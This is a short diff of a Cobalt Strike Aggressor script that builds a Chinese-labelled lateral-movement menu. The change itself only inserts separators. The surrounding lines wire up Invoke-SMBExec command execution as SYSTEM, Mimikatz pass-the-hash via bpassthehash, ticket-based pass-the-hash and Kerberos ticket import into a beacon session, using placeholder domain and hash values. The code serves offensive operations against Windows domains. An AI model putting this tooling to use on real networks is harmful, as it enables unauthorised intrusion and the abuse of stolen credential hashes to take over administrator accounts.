@@ -16,6 +16,7 @@ menu "横向移动" {
 
 
 		}
+		separator();
 		item "Invoke-SMBExec" {
 			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.1.1" , Domain => "Mikasa.com" , command => "whoami" , user => "administrator" , hash => "xxx" )  ,&SMBexec);
 			dialog_description($dialog,"通过在目标机器上创建服务来执行命令,权限为SYSTEM");
@@ -28,6 +29,7 @@ menu "横向移动" {
 			dialog_show($dialog);
 
 		}
+		separator();
 		item "Mimikatz-Pth" {
 			$dialog = dialog("Mimikatz-pth" , %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , hash => "xxx" ) ,lambda({ bpassthehash($3["bid"],$3["Domain"],$3["user"],$3["hash"]); }));
 			dialog_description($dialog,"使用mimikatz进行hash传递,因为Mimikatz的工作机制必须要有本地的管理员权限");
@@ -37,6 +39,7 @@ menu "横向移动" {
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
 		}
+		separator();
 		item "pth_injection_with_Ticket" {
 			$dialog = dialog("pth_Ticket", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , Hash => "xxxx") ,&pth_injection_Ticket);
 			dialog_description($dialog,"因为使用Mimikatz传递hash需要管理员权限,所以可以采用票据的形式");
@@ -74,6 +77,7 @@ menu "横向移动" {
 				dialog_show($dialog);
 
 		}
+		separator();
 		item "import_ticket" {
 			$dialog = dialog("导如票据文件	于此会话中", %( bid => $1["@"] , file => "") ,lambda({
 				bkerberos_ticket_use($3["bid"],$3["file"])
